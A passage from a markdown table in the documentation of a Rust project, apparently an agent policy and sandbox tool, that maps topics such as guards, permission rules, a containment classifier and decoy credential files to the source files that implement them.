| `check`, layer 2, the read-only command set, the observer | [`crates/ostra-policy/src/policy.rs`](../../crates/ostra-policy/src/policy.rs) |
| Every guard and its denial text | [`crates/ostra-policy/src/guards.rs`](../../crates/ostra-policy/src/guards.rs) |
| Tool enforcement setting and its resolution | `ToolEnforcement` and `WorkspaceSettings::enforces_tool_calls` in [`crates/ostra-core/src/config.rs`](../../crates/ostra-core/src/config.rs), `Roots::strict` in [`guards.rs`](../../crates/ostra-policy/src/guards.rs) |
| Shell parsing and write targets | [`crates/ostra-policy/src/bash.rs`](../../crates/ostra-policy/src/bash.rs) |
| Build signal and streak thresholds | [`crates/ostra-policy/src/build.rs`](../../crates/ostra-policy/src/build.rs) |
| Permission rule syntax and matching | [`crates/ostra-policy/src/perms.rs`](../../crates/ostra-policy/src/perms.rs) |
| Containment signals and the classifier | [`crates/ostra-core/src/containment.rs`](../../crates/ostra-core/src/containment.rs) |
| Decoy credential files, their inotify watch, and the macOS log reader | [`crates/ostra-sandbox/src/decoy.rs`](../../crates/ostra-sandbox/src/decoy.rs), [`sys/linux/inotify.rs`](../../crates/ostra-sandbox/src/sys/linux/inotify.rs), [`sys/macos/log.rs`](../../crates/ostra-sandbox/src/sys/macos/log.rs) |
| Recording signals and the auto-pause | `EngineHost::record_signal` in [`crates/ostra-engine/src/runner.rs`](../../crates/ostra-engine/src/runner.rs), the fold in [`crates/ostra-engine/src/state.rs`](../../crates/ostra-engine/src/state.rs) |
| Guard and permission fixtures | [`crates/ostra-policy/tests/policy.rs`](../../crates/ostra-policy/tests/policy.rs) |
| Harness payload adapters | [`crates/ostra-exec-harness/src/adapters/`](../../crates/ostra-exec-harness/src/adapters/mod.rs) |
| Hook bridge, fail-closed handling | [`crates/ostra-exec-harness/src/bridge.rs`](../../crates/ostra-exec-harness/src/bridge.rs) |
